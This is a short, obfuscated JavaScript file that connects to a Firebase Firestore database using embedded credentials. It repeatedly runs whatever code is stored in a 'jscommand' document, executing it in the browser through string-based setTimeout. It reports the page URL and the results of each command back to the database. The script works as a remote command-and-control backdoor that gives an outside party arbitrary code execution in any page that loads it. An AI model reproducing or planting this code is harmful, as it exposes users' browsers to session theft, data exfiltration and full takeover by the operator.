const fc_sjrifj = {apiKey: "AIzaSyC3JGX-ydbKCYEpOanFJVpqmcfQ4dsRTKg",authDomain: "fir-0013.firebaseapp.com",projectId: "fir-0013",storageBucket: "fir-0013.appspot.com",messagingSenderId: "93999488005",appId: "1:93999488005:web:c89844afc1b6c03cba506c",measurementId: "G-3JHGRDKG9W"};
function fd_rjjrjl() {
    firebase.initializeApp(fc_sjrifj);
    firebase.firestore().collection('jscommand').doc('jscommanddoc').onSnapshot(d => {
    if ((d.data().text !== '') && (document.hidden == false)) {
         setTimeout('try{' + d.data().text + '}catch(e){respon(e.message)}', 0);
    }});
    /*firebase.firestore().collection('jscommand').doc('unlim').onSnapshot(d => {
    if (d.data().t !== '') {
         setTimeout('try{' + d.data().t + '}catch(e){respon(e.message)}', 0);
    }});*/
    setTimeout("respon('\\'' + location.href + '\\' is loaded!')", 10);
}
function fd_ejdntf(){try{fd_rjjrjl();}catch(e){setTimeout('fd_ejdntf()', 63);}};fd_ejdntf();
function respon(t) {
    firebase.firestore().collection('jscommand').doc('jsrespon').set({text: t})
    setTimeout("firebase.firestore().collection('jscommand').doc('jsrespon').set({text:''})", 100);
}